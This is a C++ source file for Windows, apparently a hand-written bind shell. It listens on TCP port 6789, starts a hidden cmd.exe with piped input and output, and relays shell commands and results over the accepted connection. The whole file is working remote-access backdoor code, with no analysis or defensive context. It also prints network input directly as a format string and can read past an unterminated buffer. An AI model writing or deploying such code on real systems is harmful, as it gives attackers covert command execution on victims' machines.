// pipcmd.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h> 
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define IP_LOCAL "0.0.0.0"
#define IP_REMOTE "192.168.13.132"
#define PORT 6789

//socket
WORD wVersionRequested = MAKEWORD(2, 2);
WSADATA wsaData;
SOCKET LocalSocket, RemoteSocket;
struct sockaddr_in LocalAddr, RemoteAddr;
//pip
HANDLE hMainRead, hMainWrite, hCmdRead, hCmdWrite;
SECURITY_ATTRIBUTES sa;
//process
STARTUPINFO si;
PROCESS_INFORMATION pi;




DWORD  WINAPI winCmdReadThreadHandle(LPVOID lpThreadParameter)
{
	int ret;
	DWORD bytesRead;
	char buffer[4095];
	while (TRUE)
	{
		memset(buffer, 0, 4095);

		if (ReadFile(hMainRead, buffer, 4095, &bytesRead, NULL) == NULL)
			continue;
		ret = send(RemoteSocket, buffer, (int)strlen(buffer), 0);
		if (ret == SOCKET_ERROR)
		{
			printf("Send Info Error::%d\n", GetLastError());
			continue;
		}
	}
	return 0;
}

int main(int argc, TCHAR *argv[])
{
	int ret;
	char buffer[4096] = { 0 };
	DWORD bytesRead;
	HANDLE hReadThread;
	DWORD lpReadThreadId = 0;
	//create socket
	if (WSAStartup(wVersionRequested, &wsaData))
	{
		printf("WSAStartup failed\n");
		return 1;
	}
	LocalSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (LocalSocket == INVALID_SOCKET)
	{
		printf("create socket failed:%d\n", GetLastError());
		return -1;
	}

	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_addr.s_addr = inet_addr(IP_LOCAL);
	LocalAddr.sin_port = htons(PORT);
	memset(LocalAddr.sin_zero, 0x00, 8);
	/* connect socket */
	ret = bind(LocalSocket, (struct sockaddr*)&LocalAddr, sizeof(LocalAddr));
	if (ret == SOCKET_ERROR)
	{
		printf("bind Error::%d\n", GetLastError());
		return -1;
	}
	int LocalAddrLen = sizeof(LocalAddr);
	ret = listen(LocalSocket, 5);
	if (ret == SOCKET_ERROR)
	{
		printf("listen Error::%d\n", GetLastError());
		return -1;
	}
	RemoteSocket = accept(LocalSocket, (struct sockaddr*)&RemoteAddr, &LocalAddrLen);
	if (RemoteSocket == INVALID_SOCKET)
	{
		printf("accept::%d\n", GetLastError());
		return -1;
	}
	//create pip
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if(!CreatePipe(&hMainRead,&hCmdWrite,&sa,0))
	{
		printf("CreatePipe failed!!\n");
		return 1;
	}
	if (!CreatePipe(&hCmdRead, &hMainWrite, &sa, 0))
	{
		printf("CreatePipe failed!!\n");
		return 1;
	}
	//create process
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hCmdWrite;
	si.hStdOutput = hCmdWrite;
	si.hStdInput = hCmdRead;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	TCHAR szPath[MAX_PATH] = { L"C:\\Windows\\System32\\cmd.exe" };
	TCHAR szCmdLine[MAX_PATH] = {
		//L"cmd.exe"
		L" dir\r\n" // 注意前面的空格
	};
	if(!CreateProcess(szPath, NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess failed!!\n");
		return 0;
	}
	//CloseHandle(hWrite);
	hReadThread = CreateThread(NULL,0,winCmdReadThreadHandle,NULL,0, &lpReadThreadId);
	while (TRUE)
	{
		memset(buffer, 0, 4095);
		ret = recv(RemoteSocket, buffer, 4096, 0);
		if (ret == SOCKET_ERROR)
		{
			printf("recv Info Error::%d\n", GetLastError());
			break;
		}
		printf(buffer);
		if (WriteFile(hMainWrite, buffer, strlen(buffer), &bytesRead, NULL) == NULL)
			break;
	}
	printf("process exited!!\n");
    return 0;
}

